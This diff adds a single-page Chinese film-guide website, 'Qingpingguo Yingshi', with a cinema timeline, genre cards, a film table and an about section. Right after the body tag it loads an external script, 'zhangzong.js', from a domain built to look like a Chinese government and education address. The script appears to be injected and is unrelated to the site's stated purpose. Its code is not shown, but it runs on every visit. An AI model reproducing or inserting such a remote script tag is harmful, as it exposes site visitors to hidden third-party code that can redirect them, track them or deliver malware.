@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="青苹果影视（qingpingguoyingshi-zh）是一家面向华语观众的影视资讯与观影指南站点，提供院线新片速递、类型片解读、片单推荐与观影档案整理，网址为 https://qingpingguoyingshi-zh.github.io。">
+<meta name="keywords" content="青苹果影视, qingpingguoyingshi-zh, 华语影视资讯, 电影推荐, 观影指南">
+<meta name="author" content="青苹果影视">
+<title>青苹果影视 · qingpingguoyingshi-zh | 华语影视资讯与观影指南</title>
+<style>
+:root{
+  --bg:#f4f7f2;
+  --paper:#ffffff;
+  --ink:#1f2a23;
+  --ink2:#4a5b50;
+  --apple:#3f7d3a;
+  --apple-d:#2c5c28;
+  --leaf:#8fbf5f;
+  --line:#dbe4d4;
+  --shadow:0 2px 10px rgba(44,92,40,.07);
+}
+*{box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  margin:0;
+  background:var(--bg);
+  color:var(--ink);
+  font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",-apple-system,sans-serif;
+  font-size:15px;
+  line-height:1.85;
+  -webkit-text-size-adjust:100%;
+}
+a{color:var(--apple-d);text-decoration:none;}
+a:hover{text-decoration:underline;}
+
+/* 顶部 */
+.topbar{
+  background:linear-gradient(135deg,var(--apple-d),var(--apple) 60%,var(--leaf));
+  color:#fff;
+}
+.topbar .inner{
+  max-width:1040px;margin:0 auto;padding:26px 20px 22px;
+  display:flex;align-items:flex-end;justify-content:space-between;gap:16px;flex-wrap:wrap;
+}
+.brand h1{
+  margin:0;font-size:27px;letter-spacing:1px;font-weight:700;
+  text-shadow:0 1px 2px rgba(0,0,0,.15);
+}
+.brand .sub{font-size:12.5px;opacity:.9;margin-top:5px;letter-spacing:.5px;}
+.brand .url{
+  display:inline-block;margin-top:9px;font-size:12px;background:rgba(255,255,255,.16);
+  padding:3px 10px;border-radius:20px;font-family:ui-monospace,Menlo,monospace;
+}
+.nav{
+  position:sticky;top:0;z-index:50;background:rgba(255,255,255,.96);
+  backdrop-filter:blur(6px);border-bottom:1px solid var(--line);
+  box-shadow:0 1px 6px rgba(44,92,40,.06);
+}
+.nav ul{
+  max-width:1040px;margin:0 auto;padding:0 12px;list-style:none;
+  display:flex;gap:4px;overflow-x:auto;
+}
+.nav li{flex:0 0 auto;}
+.nav a{
+  display:block;padding:12px 13px;font-size:13.5px;color:var(--ink2);
+  border-bottom:2px solid transparent;white-space:nowrap;
+}
+.nav a:hover{color:var(--apple-d);border-bottom-color:var(--leaf);text-decoration:none;background:#f0f6ee;}
+
+/* 布局 */
+.wrap{max-width:1040px;margin:0 auto;padding:0 20px 60px;}
+section{padding-top:44px;}
+.sec-h{
+  display:flex;align-items:center;gap:11px;margin:0 0 18px;
+}
+.sec-h .no{
+  font-size:12px;font-weight:700;color:#fff;background:var(--apple);
+  width:27px;height:27px;border-radius:8px;display:grid;place-items:center;flex:0 0 auto;
+}
+.sec-h h2{margin:0;font-size:20px;letter-spacing:.5px;}
+.sec-h .en{margin-left:auto;font-size:11.5px;color:#8aa086;letter-spacing:1px;text-transform:uppercase;}
+
+/* 栏目概述 */
+.lead{
+  background:var(--paper);border:1px solid var(--line);border-radius:14px;
+  padding:22px 24px;box-shadow:var(--shadow);
+}
+.lead p{margin:0 0 12px;}
+.lead p:last-child{margin-bottom:0;}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:12px;margin-top:20px;}
+.stat{background:#f2f7ef;border:1px solid var(--line);border-radius:11px;padding:14px 12px;text-align:center;}
+.stat b{display:block;font-size:21px;color:var(--apple-d);}
+.stat span{font-size:12px;color:var(--ink2);}
+
+/* 时间线 */
+.tl{position:relative;padding-left:26px;}
+.tl::before{content:"";position:absolute;left:7px;top:6px;bottom:6px;width:2px;background:var(--line);}
+.tl .item{position:relative;background:var(--paper);border:1px solid var(--line);border-radius:12px;padding:15px 18px;margin-bottom:12px;box-shadow:var(--shadow);}
+.tl .item::before{
+  content:"";position:absolute;left:-24px;top:20px;width:12px;height:12px;border-radius:50%;
+  background:var(--leaf);border:3px solid #fff;box-shadow:0 0 0 2px var(--leaf);
+}
+.tl .yr{font-size:13px;font-weight:700;color:var(--apple-d);}
+
+/* 类型 */
+.genre{display:grid;grid-template-columns:repeat(3,1fr);gap:13px;}
+.card{background:var(--paper);border:1px solid var(--line);border-radius:12px;padding:17px 18px;box-shadow:var(--shadow);}
+.card h3{margin:0 0 7px;font-size:15.5px;color:var(--apple-d);}
+.card p{margin:0;font-size:13.5px;color:var(--ink2);}
+.tagbar{display:flex;flex-wrap:wrap;gap:7px;margin-top:13px;}
+.tag{font-size:12px;background:#eaf3e6;color:var(--apple-d);padding:3px 11px;border-radius:20px;border:1px solid #d6e8d1;}
+
+/* 资料库表格 */
+.tbl-wrap{background:var(--paper);border:1px solid var(--line);border-radius:14px;overflow-x:auto;box-shadow:var(--shadow);}
+table{width:100%;border-collapse:collapse;font-size:13.5px;min-width:560px;}
+th,td{padding:11px 14px;text-align:left;border-bottom:1px solid var(--line);}
+th{background:#eef5ea;color:var(--apple-d);font-weight:600;font-size:13px;}
+tr:last-child td{border-bottom:none;}
+tbody tr:hover{background:#f7faf5;}
+
+/* 观点 */
+.views{display:grid;grid-template-columns:repeat(2,1fr);gap:14px;}
+.note{background:var(--paper);border-left:4px solid var(--leaf);border-radius:0 12px 12px 0;padding:16px 18px;box-shadow:var(--shadow);}
+.note h3{margin:0 0 7px;font-size:15px;}
+.note p{margin:0;font-size:13.5px;color:var(--ink2);}
+
+/* 关于 */
+.about{background:var(--paper);border:1px solid var(--line);border-radius:14px;padding:22px 24px;box-shadow:var(--shadow);}
+.about p{margin:0 0 12px;font-size:14px;}
+.about p:last-child{margin-bottom:0;}
+.info{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;margin-top:18px;}
+.info div{background:#f2f7ef;border:1px solid var(--line);border-radius:11px;padding:13px 14px;}
+.info dt{font-size:11.5px;color:#7a8c74;margin:0 0 4px;}
+.info dd{margin:0;font-size:13.5px;font-family:ui-monospace,Menlo,monospace;word-break:break-all;}
+
+/* 页脚 */
+footer{background:var(--apple-d);color:#e4eee0;margin-top:50px;}
+footer .in{max-width:1040px;margin:0 auto;padding:26px 20px;font-size:12.5px;}
+footer p{margin:0 0 7px;}
+footer .line{opacity:.32;height:1px;background:#fff;margin:14px 0;}
+footer a{color:#cfe6c8;}
+
+@media (max-width:820px){
+  .stats,.info{grid-template-columns:repeat(2,1fr);}
+  .genre,.views{grid-template-columns:repeat(2,1fr);}
+}
+@media (max-width:600px){
+  .topbar .inner{padding:20px 18px;}
+  .brand h1{font-size:22px;}
+  .sec-h .en{display:none;}
+  .stats,.info,.genre,.views{grid-template-columns:1fr;}
+  section{padding-top:34px;}
+  .wrap{padding:0 14px 44px;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="topbar">
+  <div class="inner">
+    <div class="brand">
+      <h1>青苹果影视</h1>
+      <div class="sub">qingpingguoyingshi-zh · 华语影视资讯与观影指南</div>
+      <div class="url">https://qingpingguoyingshi-zh.github.io</div>
+    </div>
+    <div class="brand" style="text-align:right;">
+      <div class="sub">更新于 2026 年 10 月</div>
+    </div>
+  </div>
+</div>
+
+<nav class="nav">
+  <ul>
+    <li><a href="#overview">栏目概述</a></li>
+    <li><a href="#timeline">发展脉络</a></li>
+    <li><a href="#genre">类型图鉴</a></li>
+    <li><a href="#dbase">作品资料库</a></li>
+    <li><a href="#views">观察与讨论</a></li>
+    <li><a href="#about">关于本站</a></li>
+  </ul>
+</nav>
+
+<div class="wrap">
+
+  <section id="overview">
+    <div class="sec-h"><span class="no">01</span><h2>栏目概述</h2><span class="en">Overview</span></div>
+    <div class="lead">
+      <p><strong>青苹果影视</strong>（站点标识 qingpingguoyingshi-zh）把精力放在华语电影的资讯整理与观影引导上，不做资源搬运，只做信息筛选与内容解读。栏目设置围绕「看完一部片之后还想再多知道一点」这个需求展开。</p>
+      <p>全站目前由六个板块构成：栏目概述说明建站思路，发展脉络梳理近三十年的产业节点，类型图鉴给出片种与观看入口，作品资料库是可检索的文字档案，观察与讨论收录编辑部的短评与选题思考，关于本站则交代更新节奏与联系办法。</p>
+      <p>访问入口统一为 <a href="https://qingpingguoyingshi-zh.github.io">https://qingpingguoyingshi-zh.github.io</a>，页面在手机与电脑上均可正常阅读。</p>
+      <div class="stats">
+        <div class="stat"><b>06</b><span>常设栏目</span></div>
+        <div class="stat"><b>30+</b><span>梳理的产业节点</span></div>
+        <div class="stat"><b>12</b><span>覆盖的影片类型</span></div>
+        <div class="stat"><b>周更</b><span>内容更新频率</span></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="timeline">
+    <div class="sec-h"><span class="no">02</span><h2>发展脉络</h2><span class="en">Timeline</span></div>
+    <div class="tl">
+      <div class="item"><div class="yr">1990 年代 · 录像厅与港片北上的年代</div><p>以录像带、镭射影碟为主要介质，港产商业片构成大陆观众的影像启蒙，类型杂糅、节奏明快是其显著特征。</p></div>
+      <div class="item"><div class="yr">2002 — 2005 · 大片时代开启</div><p>《英雄》《无极》等作品把国产电影推入高成本制作阶段，院线建设同步提速，观影从偶尔为之变为日常消费。</p></div>
+      <div class="item"><div class="yr">2010 年前后 · 互联网发行改写格局</div><p>视频平台开始介入版权采购与自制内容，中小成本影片获得新的出口，文艺片也借由线上放映找到观众。</p></div>
+      <div class="item"><div class="yr">2015 — 2019 · 类型片成熟与票房爆发</div><p>喜剧、悬疑、动画各自形成稳定的创作班底与受众群体，单银幕产出提升，市场从「有没有人看」转向「谁在看」。</p></div>
+      <div class="item"><div class="yr">2020 年至今 · 分化与重建</div><p>档期效应被反复验证，口碑对票房的影响权重上升，纪录片、短剧、微短内容填补碎片化时段，行业进入精细化运营阶段。</p></div>
+    </div>
+  </section>
+
+  <section id="genre">
+    <div class="sec-h"><span class="no">03</span><h2>类型图鉴</h2><span class="en">Genre</span></div>
+    <div class="genre">
+      <div class="card"><h3>现实题材</h3><p>以当下生活为取材对象，重视细节可信度与社会议题的呈现方式，近年数量增长明显。</p></div>
+      <div class="card"><h3>悬疑犯罪</h3><p>强情节驱动，时间线叙事与多视角结构是常用手法，对剧本严密度要求最高。</p></div>
+      <div class="card"><h3>家庭伦理</h3><p>聚焦代际关系与情感冲突，表演空间大，常在小成本制作中取得口碑突破。</p></div>
+      <div class="card"><h3>历史古装</h3><p>服化道与美术是核心竞争力，近年更倾向于从具体人物切入而非宏大叙事。</p></div>
+      <div class="card"><h3>喜剧</h3><p>最依赖档期与合家欢氛围的类型，笑点密度与地域文化表达决定传播上限。</p></div>
+      <div class="card"><h3>动画</h3><p>从低龄向走向全年龄，系列化开发初见成效，技术门槛仍是主要制约。</p></div>
+    </div>
+    <div class="tagbar">
+      <span class="tag">导演研究</span><span class="tag">摄影与美术</span><span class="tag">编剧手法</span>
+      <span class="tag">配乐分析</span><span class="tag">演员表演</span><span class="tag">海外发行</span><span class="tag">修复版放映</span>
+    </div>
+  </section>
+
+  <section id="dbase">
+    <div class="sec-h"><span class="no">04</span><h2>作品资料库</h2><span class="en">Archive</span></div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>作品</th><th>年代</th><th>主要类型</th><th>值得关注之处</th></tr></thead>
+        <tbody>
+          <tr><td>《活着》</td><td>1994</td><td>家庭 / 历史</td><td>以个体命运映射时代变迁，表演层次丰富</td></tr>
+          <tr><td>《阳光灿烂的日子》</td><td>1993</td><td>青春 / 成长</td><td>主观记忆与叙事视角的结合方式</td></tr>
+          <tr><td>《霸王别姬》</td><td>1993</td><td>历史 / 传记</td><td>戏曲程式与人物命运的互文结构</td></tr>
+          <tr><td>《三峡好人》</td><td>2006</td><td>现实 / 公路</td><td>空间变迁作为叙事主体，长镜头运用</td></tr>
+          <tr><td>《心迷宫》</td><td>2014</td><td>悬疑 / 犯罪</td><td>多线叙事的低成本实践样本</td></tr>
+          <tr><td>《大象席地而坐》</td><td>2018</td><td>现实 / 青春</td><td>长篇幅与压抑情绪的节奏控制</td></tr>
+          <tr><td>《流浪地球》</td><td>2019</td><td>科幻 / 灾难</td><td>本土科幻的工业化起点与视觉体系建立</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p style="font-size:12.5px;color:#7a8c74;margin-top:10px;">资料库仅收录已正式公映的作品，条目以文字介绍为主，不含任何下载或在线播放渠道。</p>
+  </section>
+
+  <section id="views">
+    <div class="sec-h"><span class="no">05</span><h2>观察与讨论</h2><span class="en">Views</span></div>
+    <div class="views">
+      <div class="note"><h3>口碑为何越来越影响票房</h3><p>社交平台把映后评价压缩进首周末，排片调整周期随之缩短，影片质量与宣发投入的权重正在重新分配。</p></div>
+      <div class="note"><h3>档期依赖是机会也是风险</h3><p>节假日观影习惯已经形成，但扎堆上映会让中小制作失去排片空间，错峰发行开始被更多片方考虑。</p></div>
+      <div class="note"><h3>类型融合成为常态</h3><p>纯类型片减少，喜剧加悬疑、现实加奇幻的组合更常见，观众对单一情绪的耐受度在下降。</p></div>
+      <div class="note"><h3>影评写作的位置</h3><p>短评负责第一时间筛选，长文负责解释为何值得看，两者服务的决策阶段不同，不能互相替代。</p></div>
+    </div>
+  </section>
+
+  <section id="about">
+    <div class="sec-h"><span class="no">06</span><h2>关于本站</h2><span class="en">About</span></div>
+    <div class="about">
+      <p><strong>青苹果影视</strong>是一个由几位长期写影评的编辑共同维护的非商业站点，内容以华语电影为主，兼顾少量华语剧集与纪录片。我们不持有任何影视版权，也不提供资源下载与在线观看服务，站内所有文字均为原创或经授权的转载。</p>
+      <p>更新节奏为每周两到三篇，形式包括新片短评、专题梳理与资料整理。栏目结构会随内容积累做小幅调整，但资讯与解读的定位不变。</p>
+      <p>站点的正式访问地址为 <a href="https://qingpingguoyingshi-zh.github.io">https://qingpingguoyingshi-zh.github.io</a>，建议收藏该网址以便获取最新内容。</p>
+      <div class="info">
+        <div><dt>网站名称</dt><dd>青苹果影视</dd></div>
+        <div><dt>站点标识</dt><dd>qingpingguoyingshi-zh</dd></div>
+        <div><dt>网站网址</dt><dd>qingpingguoyingshi-zh.github.io</dd></div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer>
+  <div class="in">
+    <p>青苹果影视 · qingpingguoyingshi-zh ｜ 华语影视资讯与观影指南</p>
+    <p>本站网址：<a href="https://qingpingguoyingshi-zh.github.io">https://qingpingguoyingshi-zh.github.io</a></p>
+    <div class="line"></div>
+    <p>本页为静态单页，内链采用锚点跳转；内容仅供交流与参考，转载请注明出处。</p>
+  </div>
+</footer>
+
+</body>
+</html>
